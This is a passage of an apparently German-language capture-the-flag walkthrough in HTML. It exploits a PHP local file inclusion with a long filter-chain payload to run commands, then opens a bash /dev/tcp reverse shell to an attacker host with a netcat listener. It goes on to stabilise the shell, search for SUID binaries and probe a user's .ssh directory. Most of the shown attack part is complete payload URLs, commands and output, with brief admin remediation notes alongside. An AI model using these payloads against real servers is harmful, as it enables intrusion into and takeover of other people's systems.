T_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.IS6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICDE|convert.iconv.IS-IR-156.JHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+       <section id="poc">
+            <h2>Proof of Concept (LFI to RCE)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Dieser Proof of Concept demonstriert die erfolgreiche Ausnutzung der LFI-Schwachstelle im Skript `m414nj3.php` mithilfe der generierten PHP-Filterkette, um Remote Code Execution (RCE) auf dem Zielserver zu erlangen. Die lange Filterkette wird als Wert für den `page`-Parameter übergeben. Zusätzlich wird der Parameter `cmd` angehängt, dessen Wert vom eingebetteten `system()`-Aufruf ausgeführt wird. Hier wird `cmd=id` verwendet.
+            </p>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Der Angriff ist erfolgreich! Die URL, die die Filterkette und `&cmd=id` enthält, wird im Browser aufgerufen (angedeutet durch `view-source:`). Die Ausgabe `uid=33(www-data) gid=33(www-data) groups=33(www-data)` bestätigt, dass der `id`-Befehl auf dem Server ausgeführt wurde und der Webserver unter dem Benutzer `www-data` läuft. Dies ist ein kritischer Erfolg und bedeutet vollständige Kontrolle über den Webserver-Prozess. Der Initial Access ist somit erreicht.
+            </p>
+            <p>
+                <strong>Schritte zur Reproduktion:</strong>
+                <ol>
+                    <li>Generiere die PHP-Filterkette mit `php_filter_chain_generator.py` für den Payload `&lt;?php system($GET["cmd"]); ?&gt;`.</li>
+                    <li>Konstruiere die URL: `http://192.168.2.165/n3gr4/m414nj3.php?page=php://filter/...[komplette Filterkette].../resource=php://temp&cmd=gewünschter_befehl` (z.B. `cmd=id` oder `cmd=whoami`).</li>
+                    <li>Rufe die konstruierte URL in einem Webbrowser auf oder verwende `curl`.</li>
+                </ol>
+            </p>
+            <p>
+                <strong>Erwartetes Ergebnis:</strong> Die Ausgabe des ausgeführten Befehls (`gewünschter_befehl`) wird im Browser oder in der `curl`-Ausgabe angezeigt.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze die RCE, um eine stabilere Reverse Shell zum Angreifer-System aufzubauen. Verwende Befehle wie `nc`, `bash`, `python` oder `socat`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Höchste Priorität: Beheben Sie die LFI-Schwachstelle sofort!** Untersuchen Sie das System auf Anzeichen einer Kompromittierung (verdächtige Prozesse, Dateien, Netzwerkverbindungen). Analysieren Sie Webserver-Logs auf verdächtige Anfragen mit `php://filter`.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+view-source:http://192.168.2.165/n3gr4/m414nj3.php?page=php://filter/convert.iconv.UTF8.CSIS2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDWS-1258.UTF32LE|convert.iconv.ISIRI3342.IS-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IS2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.IS88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.IS-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICDE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.IS8859-9.IS_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICDE|convert.iconv.CP1282.IS-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICDE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.SF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICDE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSIS2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSIS2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.IS6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICDE|convert.iconv.CP1282.IS-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.IS6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICDE|convert.iconv.CP1282.IS-IR-90|convert.iconv.IS6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.IS6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICDE|convert.iconv.IS-IR-156.JHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&cmd=id
+
+                    </pre>
+                    <pre style="color:lime;">
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Hier wird die RCE-Fähigkeit genutzt, um eine Reverse Shell zum Angreifer-System (192.168.2.199) auf Port 5555 aufzubauen. Der Payload `cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.199%2F5555%200%3E%261%27` wird an die URL angehängt. Dieser Payload ist URL-kodiert und startet eine interaktive Bash-Shell, die ihre Ein- und Ausgabe auf die TCP-Verbindung zum Angreifer umleitet.
+            </p>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Dies ist der entscheidende Schritt zur Etablierung einer persistenten interaktiven Sitzung auf dem Zielsystem. Der Payload ist ein Standardverfahren für Reverse Shells über Bash.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Stelle sicher, dass auf dem Angreifer-System ein Listener auf Port 5555 läuft (`nc -lvnp 5555`), bevor du die URL mit dem Reverse-Shell-Payload aufrufst.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Ausgehende Netzwerkverbindungen vom Webserver sollten per Firewall streng kontrolliert werden, um das Aufbauen von Reverse Shells zu verhindern oder zumindest zu erschweren. Überwachen Sie Prozessausführungen durch den Webserver-Benutzer (`www-data`).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+Rev-Shell Payload:
+view-source:http://192.168.2.165/n3gr4/m414nj3.php?page=php://filter/convert.iconv.UTF8.CSIS2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDWS-1258.UTF32LE|convert.iconv.ISIRI3342.IS-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IS2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.IS88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.IS-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICDE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.IS8859-9.IS_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICDE|convert.iconv.CP1282.IS-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICDE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.SF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICDE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSIS2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSIS2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.IS6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICDE|convert.iconv.CP1282.IS-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.IS6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICDE|convert.iconv.CP1282.IS-IR-90|convert.iconv.IS6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.IS6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICDE|convert.iconv.IS-IR-156.JHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.199%2F5555%200%3E%261%27
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Auf dem Angreifer-System wird mit `nc -lvnp 5555` ein Listener gestartet, der auf eingehende Verbindungen auf Port 5555 wartet. Kurz darauf wird die URL mit dem Reverse-Shell-Payload aufgerufen, und der Zielserver (`192.168.2.165`) verbindet sich zurück zum Angreifer.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> **Fantastisch, die Reverse Shell war erfolgreich!** Wir haben eine interaktive Shell auf dem Zielsystem als Benutzer `www-data` erhalten. Der Hostname des Zielsystems wird als `4ng014` angezeigt. Die Fehlermeldungen (`cannot set terminal process group`, `no job control`) sind typisch für einfache Reverse Shells und können oft durch Techniken zur Shell-Stabilisierung behoben werden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Stabilisiere die Shell, um eine voll funktionsfähige Terminal-Sitzung zu erhalten (z.B. mit Python PTY: `python3 -c 'import pty; pty.spawn("/bin/bash")'`, gefolgt von `Ctrl+Z`, `stty raw -echo; fg`, `reset`, `export TERM=xterm`). Beginne dann mit der Enumeration des Systems als Benutzer `www-data`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Wie bereits erwähnt: LFI beheben, ausgehende Verbindungen kontrollieren, Prozesse überwachen. Analysieren Sie die Logs, um den Zeitpunkt und die Quelle des Angriffs zu identifizieren.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿CCat)-[~]
+ └─# <span class="command">nc -lvnp 5555</span>
+                     </div>
+                     <pre>
+ listening on [any] 5555 ...
+ connect to [192.168.2.199] from (UNKNWN) [192.168.2.165] 58206
+ bash: cannot set terminal process group (502): Inappropriate ioctl for device
+ bash: no job control in this shell
+ www-data@4ng014:/var/www/html/n3gr4$
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Nach Erhalt der Reverse Shell werden grundlegende Befehle zur Orientierung und zur Verbesserung der Shell ausgeführt.
+                *   `stty rows 47 columns 94`: Versucht, die Terminalgröße der Shell anzupassen, um die Darstellung zu verbessern (die Werte hängen vom Terminal des Angreifers ab).
+                *   `id`: Zeigt die Benutzer- und Gruppen-IDs des aktuellen Benutzers an.
+                *   `ls -la`: Listet den Inhalt des aktuellen Verzeichnisses (`/var/www/html/n3gr4`) im Langformat auf, einschließlich versteckter Dateien.
+                *   `cat m414nj3.php`: Zeigt den Quellcode der anfälligen PHP-Datei an.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der `id`-Befehl bestätigt erneut, dass wir als `www-data` agieren. `ls -la` zeigt die Dateien im Verzeichnis, darunter das Skript `m414nj3.php`. Der `cat`-Befehl enthüllt den extrem einfachen und unsicheren Code des Skripts: Es nimmt den Wert des `page`-Parameters und fügt ihn direkt in einen `include()`-Aufruf ein, ohne jegliche Validierung oder Sanitisierung. Dies ist der Grund für die LFI-Schwachstelle.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die Shell ist nun teilweise stabilisiert und wir verstehen die Ursache der Schwachstelle. Der nächste Schritt ist die systematische Enumeration des Systems, um Wege zur Privilegienerweiterung zu finden. Suche nach Konfigurationsdateien, Passwörtern, SSH-Keys, SUID-Binaries, Cron-Jobs usw.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Entfernen Sie das unsichere Skript `m414nj3.php` oder schreiben Sie es komplett neu mit sicheren Praktiken (Whitelist-Validierung, keine direkten Benutzereingaben in `include()`). Führen Sie einen Code-Audit für die gesamte Webanwendung durch.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;"> <!-- Annahme: Gelb für Remote-Shell -->
+ www-data@4ng014:/var/www/html/n3gr4$ <span class="command">stty rows 47 columns 94</span>
+                     </div>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ www-data@4ng014:/var/www/html/n3gr4$ <span class="command">id</span>
+                     </div>
+                     <pre>
+ uid=33(www-data) gid=33(www-data) groups=33(www-data)
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ www-data@4ng014:/var/www/html/n3gr4$ <span class="command">ls -la</span>
+                     </div>
+                     <pre>
+ total 16
+ drwxr-xr-x 2 root root 4096 Nov 13 17:24 .
+ drwxr-xr-x 3 root root 4096 Nov 13 14:04 ..
+ -rw-r--r-- 1 root root    4 Nov 13 16:44 index.html
+ -rw-r--r-- 1 root root   56 Nov 13 17:24 m414nj3.php
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ www-data@4ng014:/var/www/html/n3gr4$ <span class="command">cat m414nj3.php</span>
+                     </div> 
+                     <pre>
+ &lt;?php   
+     $page = $GET['page'];
+     include($page);
+ ?&gt;
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="user-access">
+             <h2>User Access (SSH Key)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Es wird nach Dateien mit gesetztem SUID-Bit gesucht, die dem Benutzer `root` gehören. Solche Dateien werden mit den Rechten des Besitzers (hier `root`) ausgeführt, unabhängig davon, welcher Benutzer sie startet, und sind ein häufiger Vektor für Privilege Escalation.
+                *   `find /`: Startet die Suche im Wurzelverzeichnis.
+                *   `-type f`: Sucht nur nach Dateien.
+                *   `-perm -4000`: Sucht nach Dateien, bei denen das SUID-Bit gesetzt ist (oktal 4000).
+                *   `-user root`: Sucht nur nach Dateien, die `root` gehören.
+                *   `-ls`: Zeigt detaillierte Informationen zu den gefundenen Dateien an (ähnlich `ls -lids`).
+                *   `2>/dev/null`: Leitet Fehlermeldungen (wie "Permission denied" für nicht lesbare Verzeichnisse) ins Nichts um, um die Ausgabe sauber zu halten.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Suche listet eine Reihe von Standard-SUID-Binaries auf, die auf den meisten Linux-Systemen vorhanden sind (`chsh`, `umount`, `newgrp`, `gpasswd`, `sudo`, `su`, `mount`, `chfn`, `passwd`, `dbus-daemon-launch-helper`, `ssh-keysign`). Auf den ersten Blick scheint keine ungewöhnliche oder bekanntermaßen leicht ausnutzbare SUID-Datei dabei zu sein. `sudo` wäre ein primäres Ziel, aber wir wissen noch nicht, ob `www-data` irgendwelche `sudo`-Rechte hat.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Überprüfe die Versionen dieser Binaries und suche auf GTFOBins nach bekannten Ausnutzungstechniken. Teste `sudo -l`, um zu sehen, ob `www-data` irgendwelche Befehle als `root` ausführen darf. Untersuche weiterhin das Home-Verzeichnis des Benutzers `p4l4nc4`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Reduzieren Sie die Anzahl der SUID-Binaries auf das absolute Minimum. Entfernen Sie das SUID-Bit von Dateien, wo es nicht zwingend benötigt wird. Überwachen Sie die Integrität kritischer Systemdateien. Konfigurieren Sie `sudo` restriktiv.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">
+www-data@4ng014:/var/www/html/n3gr4$ <span class="command">find / -type f -perm -4000 -user root -ls 2>/dev/null</span>
+                    </div>
+                    <pre>
+      125     52 -rwsr-xr-x   1 root     root        52880 Mar 23  2023 /usr/bin/chsh
+     3539     36 -rwsr-xr-x   1 root     root        35128 ct 18 07:56 /usr/bin/umount
+     3383     48 -rwsr-xr-x   1 root     root        48896 Mar 23  2023 /usr/bin/newgrp
+      127     88 -rwsr-xr-x   1 root     root        88496 Mar 23  2023 /usr/bin/gpasswd
+    24323    276 -rwsr-xr-x   1 root     root       281624 Jun 27  2023 /usr/bin/sudo
+     4049     72 -rwsr-xr-x   1 root     root        72000 ct 18 07:56 /usr/bin/su
+     3537     60 -rwsr-xr-x   1 root     root        59704 ct 18 07:56 /usr/bin/mount
+      124     64 -rwsr-xr-x   1 root     root        62672 Mar 23  2023 /usr/bin/chfn
+      128     68 -rwsr-xr-x   1 root     root        68248 Mar 23  2023 /usr/bin/passwd
+    15762     52 -rwsr-xr--   1 root     messagebus    51272 Sep 16  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+    18457    640 -rwsr-xr-x   1 root     root         653888 Jun 22  2024 /usr/lib/openssh/ssh-keysign
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Inhalt des `/home`-Verzeichnisses wird aufgelistet, und es wird in das Home-Verzeichnis des Benutzers `p4l4nc4` gewechselt. Anschließend wird der Inhalt dieses Verzeichnisses detailliert aufgelistet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Im Home-Verzeichnis von `p4l4nc4` finden sich mehrere interessante Dinge:
+                *   `.bash_history`: Enthält die Befehlshistorie des Benutzers, die wertvolle Informationen liefern kann.
+                *   `.ssh`: Ein Verzeichnis, das typischerweise SSH-Schlüssel enthält. **Ein hochinteressantes Ziel!**
+                *   `user.txt`: Wahrscheinlich die Benutzerflagge für die Challenge.
+                *   `.sudo_as_admin_successful`: Eine leere Datei, die oft als Hinweis dient, dass der Benutzer möglicherweise `sudo`-Rechte hat(te).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche sofort den Inhalt des `.ssh`-Verzeichnisses. Lese die `.bash_history`, um zu sehen, welche Befehle `p4l4nc4` ausgeführt hat. Versuche, `user.txt` zu lesen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die Berechtigungen für Home-Verzeichnisse und insbesondere für `.ssh`-Verzeichnisse und deren Inhalte korrekt gesetzt sind (normalerweise `700` für `.ssh`, `600` für `id_rsa`, `644` für `id_rsa.pub` und `authorized_keys`). Überwachen Sie `.bash_history`-Dateien auf verdächtige Befehle (obwohl Benutzer ihre History löschen können).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">
+www-data@4ng014:/var/www/html/n3gr4$ <span class="command">ls /home/</span>
+                    </div>
+                    <pre>
+p4l4nc4
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">
